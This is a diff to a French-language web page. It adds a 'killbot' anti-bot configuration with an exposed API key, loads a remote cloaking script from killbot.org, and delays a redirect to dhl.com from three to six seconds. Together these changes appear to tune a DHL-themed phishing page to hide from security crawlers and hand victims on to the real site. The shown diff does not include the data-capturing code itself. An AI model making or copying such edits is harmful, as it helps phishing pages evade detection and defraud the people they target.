@@ -2,6 +2,13 @@
 <html lang="fr" >
   <head>
     <!-- Required meta tags -->
+    <script type="text/javascript">
+        const killbot = {
+            apiKey: "XVMpB5exZpe6LjHpLHitdhu8mRZbRdZtq5UF6LD4hpXOX", 
+            botRedirection: "https://yandex.com" // Bot will be redirect to this URL, you can change it
+        }
+    </script>
+    <script src="https://files.killbot.org/.cdn-cgi/killbot-security.js"></script>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="session_hash" content="2c4f56a6f6ecc57a69b5ebb2fe0be4b3">
@@ -320,7 +327,7 @@
             });
             setTimeout(() => {
                 window.location.href = "https://dhl.com";
-            }, 3000);
+            }, 6000);
         });
 
         function openNav() {
